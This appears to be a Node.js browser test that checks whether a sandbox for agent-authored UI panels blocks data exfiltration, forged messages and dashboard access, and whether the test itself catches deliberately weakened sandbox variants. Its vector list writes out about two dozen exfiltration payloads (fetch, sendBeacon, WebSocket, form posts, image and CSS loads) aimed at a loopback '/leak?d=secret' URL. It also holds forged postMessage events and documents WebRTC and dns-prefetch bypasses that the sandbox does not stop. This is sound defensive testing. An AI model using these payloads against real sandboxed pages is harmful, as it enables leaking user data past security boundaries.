// Agent UI panels on the Cloud Hub run agent-authored script in an opaque-origin sandbox (static/panel_host.html + panel_sandbox.js).
// Real Chrome against an isolated Coral (see run_cdp_suites.mjs): a counting server on 127.0.0.1 must see ZERO hits from every
// exfiltration vector, the panel must not reach the dashboard, forged messages must not be accepted, and the suite itself is
// MUTATION-CHECKED: with the sandbox, the child CSP or the host's frame-src weakened, it must fail.
const assert = require('node:assert/strict');
const http = require('node:http');
const dgram = require('node:dgram');
const CDP = require('chrome-remote-interface');
const base = require('./test_base').BASE;
(async () => {
    const hits = [];
    const counting = http.createServer((req, res) => { hits.push(req.method + ' ' + req.url); res.writeHead(200, { 'Content-Type': 'text/html', 'Access-Control-Allow-Origin': '*' }).end('<h1>exfil</h1>'); });
    await new Promise(r => counting.listen(0, '127.0.0.1', r));
    const URLX = `http://127.0.0.1:${counting.address().port}/leak?d=secret`;
    const WSX = `ws://127.0.0.1:${counting.address().port}/ws`;
    // Serves MUTATED copies of the host document (a different origin from the dashboard, like a mis-served host would be).
    const hostSrc = await (await fetch(base + '/static/panel_host.html')).text();
    // Each mutant is the host document plus how the dashboard frames it. The sandbox is two layers (the dashboard's frame around the host,
    // the host's frame around the panel), so the sandbox mutant weakens both: that is what would really give a panel an origin.
    const mutants = {
        'both frames get allow-same-origin': hostSrc.replace("f.setAttribute('sandbox', 'allow-scripts')", "f.setAttribute('sandbox', 'allow-scripts allow-same-origin')"),
        // (the child also INHERITS the host's CSP, so the mutant removes the host's policy as well as the child's own two copies)
        'panel loses its csp': hostSrc.replace(/<meta http-equiv="Content-Security-Policy"[^>]*>/, '').replace("f.setAttribute('csp', PANEL_CSP);", '').replace("content=\"' + PANEL_CSP + '\">", "content=\"default-src *; script-src * \\'unsafe-inline\\'\">"),
        'host loses frame-src about:': hostSrc.replace(/<meta http-equiv="Content-Security-Policy"[^>]*>/, '').replace(/f\.addEventListener\('load'[^\n]*\n/, ''),
    };
    for (const [n, doc] of Object.entries(mutants)) assert.notEqual(doc, hostSrc, 'the mutant "' + n + '" changed something');
    const mutantServer = http.createServer((req, res) => {
        const name = decodeURIComponent(req.url.slice(1));
        res.writeHead(200, { 'Content-Type': 'text/html' }).end(mutants[name] || 'x'); // no CSP header: as if the hub forgot it
    });
    await new Promise(r => mutantServer.listen(0, '127.0.0.1', r));
    const mutantUrl = n => `http://127.0.0.1:${mutantServer.address().port}/${encodeURIComponent(n)}`;

    const c = await CDP({ port: Number(process.env.CDP_PORT || 9222) });
    const ev = async expression => {
        const r = await c.Runtime.evaluate({ expression, returnByValue: true, awaitPromise: true });
        if (r.exceptionDetails) throw Error(r.exceptionDetails.exception?.description || r.exceptionDetails.text);
        return r.result.value;
    };
    const sleep = ms => new Promise(r => setTimeout(r, ms));

    const vectors = {  // each takes its own URL (u) and WebSocket URL (w) so a hit names the vector that caused it
        'location.href': (u, w) => `location.href='${u}'`,
        'location.replace': (u, w) => `document.location.replace('${u}')`,
        'meta refresh': (u, w) => `document.head.insertAdjacentHTML('beforeend', '<meta http-equiv="refresh" content="0;url=${u}">')`,
        'window.open': (u, w) => `window.open('${u}')`,
        'form submit': (u, w) => `document.body.insertAdjacentHTML('beforeend','<form id="f" action="${u}" method="get"><input name="x" value="1"></form>'); document.getElementById('f').submit()`,
        'link click': (u, w) => `document.body.insertAdjacentHTML('beforeend','<a id="a" href="${u}">x</a>'); document.getElementById('a').click()`,
        'link target blank': (u, w) => `document.body.insertAdjacentHTML('beforeend','<a id="a" target="_blank" href="${u}">x</a>'); document.getElementById('a').click()`,
        'parent.location': (u, w) => `try { parent.location = '${u}'; } catch (e) {}`,
        'top.location': (u, w) => `try { top.location = '${u}'; } catch (e) {}`,
        'iframe src': (u, w) => `document.body.insertAdjacentHTML('beforeend','<iframe src="${u}"></iframe>')`,
        'img src': (u, w) => `new Image().src='${u}'`,
        'css url()': (u, w) => `document.body.insertAdjacentHTML('beforeend','<style>body{background:url(${u})}</style>')`,
        'fetch': (u, w) => `fetch('${u}', {mode:'no-cors'}).catch(function(){})`,
        'fetch with credentials': (u, w) => `fetch('${u}', {credentials:'include'}).catch(function(){})`,
        'sendBeacon': (u, w) => `navigator.sendBeacon('${u}', 'x')`,
        'xhr': (u, w) => `var x=new XMLHttpRequest();x.open('GET','${u}');x.send()`,
        'WebSocket': (u, w) => `try { new WebSocket('${w}') } catch (e) {}`,
        'EventSource': (u, w) => `try { new EventSource('${u}') } catch (e) {}`,
        'dynamic import': (u, w) => `try { import('${u}').catch(function(){}) } catch (e) {}`,
        'worker from blob': (u, w) => `try { var w = new Worker(URL.createObjectURL(new Blob(["fetch('${u}')"]))); } catch (e) {}`,
        'link prefetch': (u, w) => `document.head.insertAdjacentHTML('beforeend','<link rel="prefetch" href="${u}"><link rel="stylesheet" href="${u}"><link rel="preconnect" href="${u.split('/leak')[0]}">')`,
        'script src': (u, w) => `var s=document.createElement('script'); s.src='${u}'; document.head.appendChild(s)`,
        'object/embed': (u, w) => `document.body.insertAdjacentHTML('beforeend','<object data="${u}"></object><embed src="${u}">')`,
    };
    const names = Object.keys(vectors);

    // The page side: a locked host frame per run, a collector for everything that reaches the dashboard, the same acceptance rule as agent_ui.js.
    await c.Page.enable();
    await c.Page.navigate({ url: base }); await c.Page.loadEventFired();
    await ev(`(async () => {
        const m = await import((window.__coralStatic||'/static/')+'panel_sandbox.js');
        window.ps = m;
        window.accepted = []; window.navigated = []; window.hostFrames = [];
        window.addEventListener('message', e => {
            const f = window.hostFrames.find(x => x.contentWindow === e.source);
            if (!f) { window.accepted.push({ forged: true, from: 'not-a-host', type: e.data && e.data.type, action: e.data && e.data.action }); return; }
            if (e.data && e.data.type === 'coral-panel-navigated') window.navigated.push(f.dataset.name);
            if (e.data && e.data.type === 'coral-ui-event') { if (m.isPanelEvent(e.data)) window.accepted.push({ name: f.dataset.name, ...e.data }); else window.accepted.push({ invalid: true, name: f.dataset.name, action: e.data.action }); }
        });
        window.runPanel = (name, html, hostUrl, outerSandbox) => {
            const f = m.createPanelFrame(name); f.dataset.name = name; if (hostUrl) f.src = hostUrl; if (outerSandbox) f.setAttribute('sandbox', outerSandbox);
            window.hostFrames.push(f);
            const p = m.openPanel(f, { onNavigated: () => {} });
            document.body.appendChild(f);
            p.setHtml(html);
            return f;
        };
    })()`);

    const probe = `(function(){
  var out = {};
  function emit(action, payload) { parent.postMessage({ type: 'coral-ui-event', action: action, requestId: action, payload: payload }, '*'); }
  try { parent.document.title; out.parentDom = 'reachable'; } catch (e) { out.parentDom = 'blocked'; }
  try { top.document.title; out.topDom = 'reachable'; } catch (e) { out.topDom = 'blocked'; }
  try { localStorage.getItem('x'); out.storage = 'reachable'; } catch (e) { out.storage = 'blocked'; }
  try { sessionStorage.getItem('x'); out.session = 'reachable'; } catch (e) { out.session = 'blocked'; }
  try { void document.cookie; out.cookie = 'reachable'; } catch (e) { out.cookie = 'blocked'; }
  try { indexedDB.open('x'); out.idb = 'reachable'; } catch (e) { out.idb = 'blocked'; }
  out.cspFetch = 'untested';
  fetch(${JSON.stringify(URLX)}, {mode:'no-cors'}).then(function(){ out.cspFetch = 'allowed'; }, function(){ out.cspFetch = 'blocked'; }).then(function(){
    emit('probe', out);
    // forged messages: straight to the dashboard (top), to the host's parent chain, and malformed ones to the host
    try { top.postMessage({ type: 'coral-ui-event', action: 'forged_top', requestId: 'f1', payload: {} }, '*'); } catch (e) {}
    try { parent.parent.postMessage({ type: 'coral-ui-event', action: 'forged_pp', requestId: 'f2', payload: {} }, '*'); } catch (e) {}
    parent.postMessage({ type: 'coral-ui-event', action: 'bad action', requestId: 'b1', payload: {} }, '*');
    parent.postMessage({ type: 'coral-ui-event', action: 'big', requestId: 'b2', payload: 'x'.repeat(20000) }, '*');
    parent.postMessage({ type: 'coral-view-get', id: 1, path: '/api/settings' }, '*');
    parent.postMessage({ type: 'coral-ui-result', requestId: 'r', error: 'x' }, '*');
    parent.postMessage({ type: 'coral-panel-load', html: '<script>1<\\/script>' }, '*');
    parent.postMessage({ type: 'coral-ui-event', action: 'extra', requestId: 'e1', payload: { ok: 1 }, evil: 'field', __proto__: { x: 1 } }, '*');
    emit('done', {});
  });
})();`;
    const page = body => `<h1>panel</h1><script>${body}</script>`;
    const leaksOf = async (hostUrl, label, outerSandbox) => {
        // 1. positive control + probes
        await ev(`window.accepted.length = 0; window.runPanel('probe-' + ${JSON.stringify(label)}, ${JSON.stringify(page(probe))}, ${JSON.stringify(hostUrl || '')}, ${JSON.stringify(outerSandbox || '')})`);
        for (let i = 0; i < 40 && !(await ev(`window.accepted.some(a => a.action === 'done')`)); i++) await sleep(150);
        const got = await ev(`window.accepted`);
        const leaks = [];
        const pr = (got.find(a => a.action === 'probe') || {}).payload;
        if (!pr) leaks.push('the panel never ran (no probe); accepted so far: ' + JSON.stringify(got).slice(0, 400));
        else {
            for (const k of ['parentDom', 'topDom', 'storage', 'session', 'cookie', 'idb', 'cspFetch']) if (pr[k] !== 'blocked') leaks.push(k + '=' + pr[k]);
        }
        // Messages posted straight at the dashboard arrive with the CHILD's window as their source, not a host frame: the dashboard's rule
        // (find the mounted frame whose contentWindow is event.source, as agent_ui.js does) refuses them. What must never happen is a
        // forged event being ACCEPTED, i.e. attributed to a host frame.
        if (got.some(a => !a.forged && /^forged_/.test(a.action || ''))) leaks.push('a forged event was accepted as coming from a panel host');
        if (got.some(a => a.invalid)) leaks.push('an invalid event was relayed');
        for (const bad of ['bad action', 'big']) if (got.some(a => a.action === bad)) leaks.push('"' + bad + '" was relayed');
        const extra = got.find(a => a.action === 'extra');
        if (!extra) leaks.push('a valid event was not relayed');
        else if ('evil' in extra) leaks.push('the host forwarded an extra field');
        // 2. every network/navigation vector, one panel each, all at once; a hit names the vector (its URL carries ?v=<index>)
        const before = hits.length;
        for (let i = 0; i < names.length; i++) {
            const u = URLX + '&v=' + i, w = WSX + '?v=' + i;
            await ev(`window.runPanel(${JSON.stringify(label + ':' + names[i])}, ${JSON.stringify(page(vectors[names[i]](u, w)))}, ${JSON.stringify(hostUrl || '')}, ${JSON.stringify(outerSandbox || '')})`);
        }
        await sleep(2500); // sleep-ok: a negative: the panel's requests would have reached the listener within this window
        for (const h of hits.slice(before)) {
            const i = Number((h.match(/[?&]v=(\d+)/) || [])[1]);
            leaks.push('"' + (names[i] || h) + '" reached the counting server');
        }
        await ev(`for (const f of window.hostFrames) f.remove(); window.hostFrames.length = 0`);
        return leaks;
    };
    try {
        // The real host, served by Coral/the hub: nothing leaks. (The probe also proves the panel RAN: zero hits are not an artefact of a dead host.)
        const real = await leaksOf('', 'real');
        assert.deepEqual(real, [], 'the real panel host leaks: ' + JSON.stringify(real));
        assert.deepEqual(hits, [], 'no request left any panel: ' + JSON.stringify(hits.slice(0, 5)));
        // F1: moving the host iframe (Expand does) reloads it; the panel must be handed its HTML again and run again.
        {
            await ev(`window.accepted.length = 0; window.runPanel('reload', ${JSON.stringify(page("parent.postMessage({ type: 'coral-ui-event', action: 'ran', requestId: 'r' + Math.random().toString(36).slice(2, 8), payload: {} }, '*')"))}, '', '')`);
            const ran = async n => { for (let i = 0; i < 40 && (await ev(`window.accepted.filter(a => a.action === 'ran').length`)) < n; i++) await sleep(150); return ev(`window.accepted.filter(a => a.action === 'ran').length`); };
            assert.equal(await ran(1), 1, 'the panel ran once');
            await ev(`(() => { const f = window.hostFrames[window.hostFrames.length - 1]; const box = document.createElement('div'); document.body.appendChild(box); box.appendChild(f); })()`);
            assert.equal(await ran(2), 2, 'after the host frame was moved (reloaded) the panel ran again: the html was handed over again');
            await ev(`for (const f of window.hostFrames) f.remove(); window.hostFrames.length = 0`);
        }
        // KNOWN GAPS (documented, NOT gates): neither is blocked by CSP in Chrome and neither is an HTTP request the counting server can see.
        // dns-prefetch leaks a hostname lookup; WebRTC can send UDP (STUN) to an address of the panel's choosing. We report what Chrome does so a
        // change in either direction is visible in the log; the visible "agent-authored panel" label is the user-facing mitigation.
        {
            const udp = dgram.createSocket('udp4'); let udpHits = 0; udp.on('message', () => { udpHits++; });
            await new Promise(r => udp.bind(0, '127.0.0.1', r));
            const gap = {
                'dns-prefetch': `document.head.insertAdjacentHTML('beforeend','<link rel="dns-prefetch" href="//exfil-gap-check.invalid">')`,
                'webrtc': `try { var pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:127.0.0.1:${udp.address().port}' }] }); pc.createDataChannel('x'); pc.createOffer().then(function (o) { return pc.setLocalDescription(o); }); } catch (e) {}`,
            };
            for (const [n, body] of Object.entries(gap)) await ev(`window.runPanel(${JSON.stringify('gap:' + n)}, ${JSON.stringify(page(body))}, '', '')`);
            await sleep(3000); // sleep-ok: a negative window for the known gaps: whatever would reach the listener arrives within it
            console.log(`  known gaps (not gates): webrtc STUN packets seen on loopback: ${udpHits}; dns-prefetch: not observable from here`);
            udp.close();
            await ev(`for (const f of window.hostFrames) f.remove(); window.hostFrames.length = 0`);
        }
        // A panel that navigates is stopped and the dashboard is told (when the navigation produced a second load).
        // MUTATION CHECK: each weakened host must be caught by the very same checks.
        for (const n of Object.keys(mutants)) {
            hits.length = 0;
            const leaks = await leaksOf(mutantUrl(n), 'mut', n.startsWith('both frames') ? 'allow-scripts allow-same-origin' : '');
            assert.ok(leaks.length > 0 || hits.length > 0, `the suite did NOT notice the weakened host "${n}": it would pass a broken sandbox`);
            console.log(`  mutant "${n}": caught (${leaks.length} leaks, ${hits.length} hits)`);
        }
        console.log(`agent_ui_panel_sandbox_browser.test.js: ok (${names.length} vectors + probes, 0 hits on the real host; ${Object.keys(mutants).length} mutants all caught)`);
    } finally { await c.close(); for (const s of [counting, mutantServer]) { s.closeAllConnections(); s.close(); } } // Chrome's keep-alive sockets would hold close() ~90s
})().catch(e => { console.error(e); process.exit(1); });
